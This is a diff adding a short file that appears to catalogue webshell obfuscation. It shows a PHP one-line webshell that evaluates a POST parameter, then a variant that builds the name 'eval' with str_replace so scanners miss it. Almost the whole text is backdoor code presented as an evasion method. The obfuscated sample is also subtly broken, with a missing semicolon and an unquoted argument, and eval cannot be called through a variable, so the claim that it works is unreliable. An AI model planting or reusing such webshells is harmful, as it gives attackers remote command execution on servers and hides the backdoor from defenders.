@@ -1,0 +1,18 @@
+Original webshell sample:
+
+'''
+<?php eval($_POST["110"]);?>
+'''
+
+Webshell obtained after using the corresponding method:
+
+'''
+<?php
+$a = str_replace(x,"","xxxxxxxxxxxxexxxxxxxxxxxxxvxxxxxxxxxaxxxxxxxxxxxxl")
+$a(@$_POST["110"]);
+?>
+'''
+
+Description:
+
+The above code uses the "str_replace" method to obfuscate the sensitive function "eval", assigning it to the variable "a "and then treating "a" as a function to perform webshell function.
